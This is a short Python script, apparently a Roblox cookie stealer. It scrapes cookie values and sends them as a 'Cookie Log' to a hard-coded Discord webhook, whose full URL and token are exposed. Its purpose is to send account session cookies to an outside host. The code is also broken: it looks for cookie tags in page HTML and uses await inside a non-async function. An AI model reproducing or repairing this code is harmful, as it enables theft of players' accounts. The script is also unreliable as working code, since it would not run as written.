import requests
from bs4 import BeautifulSoup
import discord

# Discord Webhook settings
WEBHOOK_URL = "https://discord.com/api/webhooks/1541206294927511622/uxiWfvAsZE_rWaBA5gZiFJAPRGf3AWKvV92SEwjmH2SANjaE66zd9ghk8gUzeoNYy1oD"

# Image URL
IMAGE_URL = "https://th.bing.com/th/id/OIP.hHqf7ICstOhDI3F3DK3suwHaHa?w=182&h=182&c=7&r=0&o=7&pid=1.7&rm=3"

# Cookies URL
COOKIES_URL = "https://roblox.com"  # Replace with the actual cookies URL

def get_cookies(url):
    response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
    soup = BeautifulSoup(response.content, 'html.parser')
    
    cookies = []
    for cookie in soup.find_all('cookie'):
        name = cookie.attrs['name']
        value = cookie.attrs['value']
        cookies.append(f"{name}: {value}")
        
    return cookies

def send_webhook_message(webhook_url, message):
    embed = discord.Embed(title="Cookie Log", description=message)
    embed.set_image(url=IMAGE_URL)  # Set the image URL
    
    webhook = discord.Webhook.from_url(WEBHOOK_URL)
    await webhook.send(embed=embed)

# Example usage
url = COOKIES_URL
cookies = get_cookies(url)
message = "\n".join(cookies) + f"\n\nImage: {IMAGE_URL}"  # Set the image URL

send_webhook_message(WEBHOOK_URL, message)
